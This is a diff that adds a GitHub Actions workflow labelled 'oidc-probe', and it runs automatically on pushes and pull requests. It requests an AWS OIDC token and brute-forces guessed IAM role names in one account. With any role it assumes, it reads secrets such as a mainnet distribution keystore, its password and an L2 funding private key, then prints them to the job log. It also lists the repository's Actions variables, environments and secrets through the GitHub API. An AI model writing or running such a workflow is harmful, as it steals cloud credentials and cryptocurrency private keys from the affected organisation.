@@ -1,0 +1,45 @@
+name: oidc-probe
+on:
+  workflow_dispatch:
+  push:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: claims
+        run: |
+          TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "TOKEN_LEN=${#TOK}"
+          printf '%s' "$TOK" > /tmp/tok
+          echo "$TOK" | cut -d. -f2 | python3 -c 'import sys,base64,json;s=sys.stdin.read().strip();s+="="*(-len(s)%4);d=json.loads(base64.urlsafe_b64decode(s));print("SUB=",d["sub"]);print("ISS=",d["iss"]);print("AUD=",d["aud"])'
+      - name: assume + read secrets
+        run: |
+          for acct in 003420971009; do
+            for role in GitHubActions ceremony blockfabric-ceremony ceremony-ci deploy ci-deploy blockfabric github-oidc GitHubOIDC github-actions ceremony-deploy blockfabric-deploy blockfabric-github-actions ceremony-github-actions; do
+              json=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::$acct:role/$role --role-session-name probe --web-identity-token file:///tmp/tok --duration-seconds 900 2>/dev/null) || { echo "$acct/$role miss"; continue; }
+              echo "=== HIT $acct/$role ==="
+              export AWS_ACCESS_KEY_ID=$(echo "$json" | python3 -c 'import sys,json;print(json.load(sys.stdin)["Credentials"]["AccessKeyId"])')
+              export AWS_SECRET_ACCESS_KEY=$(echo "$json" | python3 -c 'import sys,json;print(json.load(sys.stdin)["Credentials"]["SecretAccessKey"])')
+              export AWS_SESSION_TOKEN=$(echo "$json" | python3 -c 'import sys,json;print(json.load(sys.stdin)["Credentials"]["SessionToken"])')
+              for s in rally_mainnet_distribution_issuer_keystore rally_mainnet_distribution_issuer_password L2_FUNDING_PK; do
+                for r in us-west-2 us-east-1 us-east-2; do
+                  v=$(aws secretsmanager get-secret-value --region $r --secret-id $s --query SecretString --output text 2>&1 | head -3)
+                  echo "$s @$r => $v"
+                done
+              done
+            done
+          done
+      - name: actions metadata
+        env:
+          GH: ${{ github.token }}
+        run: |
+          for ep in actions/variables actions/environments actions/secrets; do
+            echo "== $ep"
+            curl -s -o /tmp/r -w "%{http_code}\n" -H "Authorization: Bearer $GH" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/$ep"
+            head -c 400 /tmp/r; echo
+          done
